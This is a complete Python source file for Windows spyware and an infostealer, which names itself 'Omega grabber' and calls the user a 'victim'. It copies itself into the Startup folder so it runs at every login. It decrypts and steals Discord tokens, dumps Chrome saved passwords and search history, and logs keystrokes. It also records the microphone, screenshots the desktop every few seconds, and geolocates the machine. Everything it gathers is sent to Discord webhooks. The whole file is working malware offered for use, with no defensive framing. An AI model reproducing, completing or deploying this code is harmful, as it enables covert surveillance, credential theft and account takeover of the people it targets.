import subprocess
required_modules = [
    "keyboard", "requests", "psutil", "time", "multiprocessing",
    "sqlite3", "os", "json", "zipfile", "tempfile", "shutil",
    "pyautogui", "platform", "re", "pygetwindow", "urllib.parse",
    "base64", "Crypto.Cipher", "ctypes", "json", "urllib.request",
    "urllib.error", "base64", "cryptography.hazmat.backends",
    "cryptography.hazmat.primitives.ciphers", "datetime",
    "requests.get", "sounddevice", "scipy.io.wavfile", "PIL",
    "cryptography.hazmat.backends", "cryptography.hazmat.primitives.ciphers",
    "datetime", "requests.get", "sounddevice", "scipy.io.wavfile"
]
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        print(f"Installing {module}...")
        subprocess.call(["pip", "install", module])
import keyboard, requests, psutil, time, multiprocessing, sqlite3, os, json, zipfile,tempfile,shutil,pyautogui,platform,re
import pygetwindow as gw
from urllib.parse import urlparse, unquote
from base64 import b64encode
import urllib.request, urllib.error
import base64
from Crypto.Cipher import AES
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from json import loads as json_loads, load
from urllib.request import Request, urlopen
from json import loads, dumps
import sounddevice as sd
from scipy.io.wavfile import write
from datetime import datetime
from pydoc import doc
from PIL import ImageGrab
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)
from datetime import datetime
from requests import get
import sounddevice as sd
from scipy.io.wavfile import write
webhook_live_web ='X'
webhook_software = 'X'
webhook_keylogger = 'X'
webhook_history = "X"
webhook_password = "X"
webhook_token = "X"
webhook_mic = "X"
webhook_info = 'X'
webhook_screenshot = 'X'
keys_typed = []


def get_discord():
    def gather_token():

        def get_all():
            return get_tokens()
        
        def DecryptValue(buff, master_key=None):
            starts = buff.decode(encoding='utf8', errors='ignore')[:3]
            if starts == 'v10' or starts == 'v11':
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
        
        class DATA_BLOB(Structure):
            _fields_ = [
                ('cbData', wintypes.DWORD),
                ('pbData', POINTER(c_char))
            ]
        
        def GetData(blob_out):
            cbData = int(blob_out.cbData)
            pbData = blob_out.pbData
            buffer = c_buffer(cbData)
            cdll.msvcrt.memcpy(buffer, pbData, cbData)
            windll.kernel32.LocalFree(pbData)
            return buffer.raw
        
        def CryptUnprotectData(encrypted_bytes, entropy=b''):
            buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
            buffer_entropy = c_buffer(entropy, len(entropy))
            blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
            blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
            blob_out = DATA_BLOB()
        
            if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
                return GetData(blob_out)
        
        def get_tokens():
            tokens = []
            LOCAL = os.getenv("LOCALAPPDATA")
            ROAMING = os.getenv("APPDATA")
            PATHS = {
                "Discord": ROAMING + "\\Discord"
            }
            def search(path: str) -> list:
                path += "\\Local Storage\\leveldb"
                found_tokens = []
                if os.path.isdir(path):
                    for file_name in os.listdir(path):
                        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                            continue
                        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    try: 
                                        urllib.request.urlopen(urllib.request.Request(
                                            "https://discord.com/api/v9/users/@me",
                                            headers={
                                                'content-type': 'application/json', 
                                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                                                'authorization': token
                                            }
                                        ))
                                    except urllib.error.HTTPError as e:
                                        continue
                                    if token not in found_tokens and token not in tokens:
                                        found_tokens.append(token)
                return found_tokens
            
            def encrypt_search(path):
                if not os.path.exists(f"{path}/Local State"): return []
                pathC = path + "\\Local Storage\\leveldb"
                found_tokens = []
                pathKey = path + "/Local State"
                with open(pathKey, 'r', encoding='utf-8') as f: local_state = json.loads(f.read())
                master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                master_key = CryptUnprotectData(master_key[5:])
                for file in os.listdir(pathC):
                    if file.endswith(".log") or file.endswith(".ldb")   :
                        for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                            for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                tokenDecoded = DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                                try: 
                                    urllib.request.urlopen(urllib.request.Request(
                                        "https://discord.com/api/v9/users/@me",
                                        headers={
                                            'content-type': 'application/json', 
                                            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                                            'authorization': tokenDecoded
                                        }
                                    ))
                                except urllib.error.HTTPError as e:
                                    continue
                                if tokenDecoded not in found_tokens and tokenDecoded not in tokens:
                                    found_tokens.append(tokenDecoded)
                return found_tokens
            for path in PATHS:
                for token in search(PATHS[path]):
                    tokens.append(token)
                for token in encrypt_search(PATHS[path]):
                    tokens.append(token)
            return tokens
        token = get_tokens()[0]
        return token
    
    def getheaders(token):
        headers = {
            "Content-Type": "application/json",
            'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
        }
        if token: 
            headers["Authorization"] = token
        return headers

    def get_account_info():
        content = requests.get('https://discord.com/api/v9/users/@me',headers=getheaders(gather_token())).json()
        for element in content:
            r = requests.post(webhook_token, json={'username': 'd!scord', 'content': element + ' : ' +str(content[element])})
        r = requests.post(webhook_token, json={'username': 'd!scord', 'content': 'token' + '  :  ' + gather_token()})

    get_account_info()


def on_software(webhook_url):
    for proc in psutil.process_iter(['pid', 'name']):
        content = f"PID: {proc.info['pid']}, Nom: {proc.info['name']}"
        r = requests.post(webhook_url, json={'username': 'software', 'content': content})
        print(f'on_software {r.status_code}')

def live_web(webhook_url):
    while True:
        active_window = gw.getActiveWindow()
        if active_window is not None:
            active_win = active_window.title
            time.sleep(1)
            content = active_window.title
            r = requests.post(webhook_url, json={'username': 'live web', 'content': content})
            print(f'liveweb {r.status_code}')


def history():
    MAX_MESSAGE_LENGTH = 2000
    def close_chrome_process():
        for process in psutil.process_iter(attrs=['pid', 'name']):
            if 'chrome' in process.info['name'].lower():
                try:
                    psutil.Process(process.info['pid']).terminate()
                    print(f"Processus Chrome (PID {process.info['pid']}) fermé.")
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass

    def get_chrome_history():
        history_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        if os.path.exists(history_path):
            conn = sqlite3.connect(history_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url FROM urls WHERE url LIKE '%search?q=%'")
            search_results = cursor.fetchall()
            conn.close()
            return search_results
        else:
            return []
        
    def send_to_discord(message):
        payload = {
            "content": message
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(webhook_history, data=json.dumps(payload), headers=headers)
    
    close_chrome_process()

    if os.path.exists(os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"):
        search_results = get_chrome_history()
        if search_results:
            search_list = [unquote(urlparse(result[0]).query.split("q=")[1].split("&")[0]) for result in search_results]
            numbered_search_list = [f"{i + 1}. {search}" for i, search in enumerate(search_list)]
            message = "\n".join(numbered_search_list)
            message_parts = [message[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(message), MAX_MESSAGE_LENGTH)]
            for part in message_parts:
                send_to_discord(part)
        else:
            pass
    else:
        send_to_discord("Il est impossible de récupérer l'historique car Google Chrome n'est pas installé.")

def get_password():

    def send_zip_to_discord(webhook_url, zip_file_path):
        with open(zip_file_path, "rb") as file:
            file_data = file.read()
        files = {
            "file": ("archive.zip", file_data)
        }
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            pass
        else:
            pass

    def get_chrome_data(db_file):
        connection = sqlite3.connect(db_file)
        cursor = connection.cursor()
        cursor.execute("SELECT * FROM logins")
        rows = cursor.fetchall()
        data = []
        for row in rows:
            converted_row = [b64encode(item).decode('utf-8') if isinstance(item, bytes) else str(item) for item in row]
            data.append(converted_row)
        connection.close()
        return data

    def write_data_to_txt(data, file_path):
        with open(file_path, "w") as file:
            file.write("\n".join(data))

    def delete_folder(folder_path):
        try:
            shutil.rmtree(folder_path)
        except:
            pass

    def delete_zip(zip_file_path):
        try:
            os.remove(zip_file_path)
        except:
            pass

    chrome_db_file = "C:\\Users\\zanat\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    output_folder = "mdp"
    zip_file_path = "chrome_data_mdp.zip"
    temp_dir = tempfile.mkdtemp()   
    chrome_data = get_chrome_data(chrome_db_file)       
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)       
    for index, part in enumerate(chrome_data, start=1):
        url = part[0]
        domain = urlparse(url).netloc
        txt_file_path = os.path.join(output_folder, f"{domain}_{index}.txt")
        write_data_to_txt(part, txt_file_path)      
    with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for folder_name, subfolders, filenames in os.walk(output_folder):
            for filename in filenames:
                file_path = os.path.join(folder_name, filename)
                arcname = os.path.relpath(file_path, output_folder)
                zipf.write(file_path, arcname)     
    send_zip_to_discord(webhook_password, zip_file_path) 
    shutil.rmtree(temp_dir)
    folder_to_delete = output_folder
    zip_to_delete = zip_file_path   
    delete_folder(folder_to_delete)
    delete_zip(zip_to_delete)

def keylogger():
    
    def process_keys():
        global keys_typed
        if keys_typed:
            content = ''.join(keys_typed)
            r = requests.post(webhook_keylogger, json={'username': 'keylogger', 'content': content})
            print(f'keylogger {r.status_code}')
            keys_typed = []
    keyboard.add_hotkey('enter', process_keys)
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            if event.name == 'space':
                keys_typed.append(' ')
            elif len(event.name) == 1:
                keys_typed.append(event.name)

def mic_record():
        
    def RECORD_AND_SEND():
        fs = 44100 
        seconds = 10
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        temp_dir = tempfile.mkdtemp()
        file_path = os.path.join(temp_dir, "micro.wav")
        write(file_path, fs, myrecording)
        date = datetime.today().strftime('%Y-%m-%d %Hh%M')
        renamed_file_path = os.path.join(temp_dir, f'{date}.wav')
        os.rename(file_path, renamed_file_path)
        with open(renamed_file_path, 'rb') as file:
            files = {'file': file}
            payload = {'username': 'microphone'}
            response = requests.post(webhook_mic, data=payload, files=files)
        os.remove(renamed_file_path)
        os.rmdir(temp_dir)
    while True:
        RECORD_AND_SEND()

def user_info():
    
    date = datetime.today().strftime('%Y-%m-%d %H:%M')
    my_system = platform.uname()
    url = "http://ipinfo.io/json"
    resp = get(url)
    json = resp.json()
    ip = json['ip']
    city = json["city"]
    region = json["region"]
    postal = json["postal"]
    country = json['country']
    loc = json['loc']
    org = json['org']
    postal = json['postal']
    time_zone = json['timezone']
    victim_name = os.getlogin()
    system_mark = my_system.system
    name = my_system.node
    os_version = my_system.release
    system = my_system.version
    machine = my_system.machine
    processeur = my_system.processor
    message = '\n'.join([
        '**@everyone**',
        '**New session start : **',
        '-> '+ date,
        '**--------------------------**',
        '**victim name : **' + victim_name,
        '**Os system : **' + system_mark,
        '**Node name : **' + name,
        '**Os release : **' + my_system.release,
        '**Os version : **' + my_system.version,
        '**Machine type : **' + my_system.machine,
        '**Processor : **' + my_system.processor,
        '**---------------------------**',
        '**Ip adress: **' + ip,
        '**Departure : **' + region,
        '**City : **' + city,
        '**Postal : **' + postal,
        '**Country : **' + country,
        '**Location : **' + loc,
        '**Org : **' + org,
        '**Time zone : **' + time_zone,
        '**---------------------------**'
    ])
    r = requests.post(webhook_info,json={'username': 'user', 'content': message})

def screenshot():
        
    def mc():
        temp_dir = tempfile.mkdtemp()
        file_path = os.path.join(temp_dir, "image.jpg")
        screen = pyautogui.screenshot()
        screen.save(file_path)
        with open(file_path, 'rb') as file:
            files = {'file': file}
            payload = {'username': 'Omega grabber'}
            response = requests.post(webhook_screenshot, data=payload, files=files)
        os.remove(file_path)
        os.rmdir(temp_dir)
    while True:
        mc()
        time.sleep(5)
if __name__ == "__main__":
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_name = os.path.basename(script_path)
    destination_path = os.path.join(startup_folder, script_name)
    try:
        shutil.copy(script_path, destination_path)
    except Exception as e:
        pass
    webhook_software_process = multiprocessing.Process(target=on_software, args=(webhook_software,))
    live_web_process = multiprocessing.Process(target=live_web, args=(webhook_live_web,))
    keylogger_process = multiprocessing.Process(target=keylogger)
    history_process = multiprocessing.Process(target=history)
    password_process = multiprocessing.Process(target=get_password)
    discord_process = multiprocessing.Process(target=get_discord)
    mic_process = multiprocessing.Process(target=mic_record)
    user_process = multiprocessing.Process(target=user_info)
    screenshot_process = multiprocessing.Process(target=screenshot)
    processes = [webhook_software_process, live_web_process, keylogger_process, history_process,password_process,discord_process,mic_process,user_process,screenshot_process]
    for process in processes:
        process.start()
    try:
        for process in processes:
            process.join()
    except:
        pass
